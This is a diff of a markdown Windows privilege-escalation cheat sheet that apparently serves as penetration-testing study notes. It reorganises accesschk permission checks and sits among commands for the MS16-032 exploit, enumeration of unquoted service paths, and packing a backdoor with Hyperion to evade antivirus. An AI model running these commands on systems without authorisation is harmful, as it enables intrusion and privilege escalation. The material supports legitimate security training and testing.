@@ -11,7 +11,6 @@
 * [Bypassing AV](#Bypassing-AV)
 * [Automated Tools](#Automated-Tools)
 * [Cheat Sheets](#Cheat-Sheets)
-* [Links](#Links)
 * [Nothing is working --> SOS](#nothing-is-working----sos)
 
 ## MUST RUN: ipconfig/ifconfig && whoami && cat local.txt
@@ -278,19 +277,22 @@ $ net users Administrator
 	C:\tmp>powershell -ExecutionPolicy ByPass -command "& { . C:\tmp\Invoke-MS16-032.ps1; Invoke-MS16-032 }"
 	```
 - Processes Running as system
-	* Do not gloss over! Important
+	* *Do not gloss over! IMPORTANT*
 	```systemprocesses
 	tasklist /v /fi "username eq system"
 	```
+- Check Weak File Permissions 
+```
+
+accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
+```
+	* [More commands](http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet)
 - [Unquoted Service Path](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
 	```unquoted
 	wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””
 	```
 	* [EoP 2: Find unquoted paths](https://guif.re/windowseop)
-- Check Weak Permissions 
-*** TO DO ****
-//more commands at http://www.exumbraops.com/penetration-testing-102-windows-privilege-escalation-cheatsheet
-
 - [Scheduled Tasks](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
 	* Option 1 
 	```schtasks
@@ -362,12 +364,6 @@ $ net users Administrator
 
 CHECKLIST (https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
 
-accesschk.exe -uwcqv "Authenticated Users" * /accepteula
-accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
-
-sc -- tells you what program is running
-systeminternals
-accesschk.exe
 - Network Information
 ```
 $ ipconfig /all & route print & arp -a
@@ -408,8 +404,6 @@ $ wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe
 ## Cheat Sheets
 * [Reverse Shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 )
-
-## Links
 * [Spreadsheet with Resources](https://docs.google.com/spreadsheets/d/12bT8APhWsL-P8mBtWCYu4MLftwG1cPmIL25AEBtXDno/edit#gid=2075148101)
 
 ## Nothing is working --> SOS
